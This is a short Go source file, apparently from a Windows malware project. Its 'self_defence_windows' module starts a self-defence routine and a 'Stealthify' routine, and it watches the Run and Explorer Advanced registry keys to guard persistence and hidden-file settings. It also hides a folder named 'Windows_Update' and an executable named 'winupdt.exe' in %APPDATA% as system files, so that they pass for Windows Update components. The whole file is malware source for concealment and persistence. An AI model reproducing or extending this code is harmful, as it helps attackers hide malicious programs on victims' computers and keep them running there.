package self_defence_windows

import("os/exec"
        "C")

func Install(){
  go C.SelfDefense();
  go C.WatchReg(C.CString("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"), true);
  go C.WatchReg(C.CString("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), false);
  go Stealthify()
}

func Mirror() {
	run("attrib +S +H %APPDATA%\\Windows_Update")
	run("attrib +S +H %APPDATA%\\Windows_Update\\winupdt.exe")
}

func run(cmd string) {
	exec.Command("cmd", "/C", cmd).Run()
}
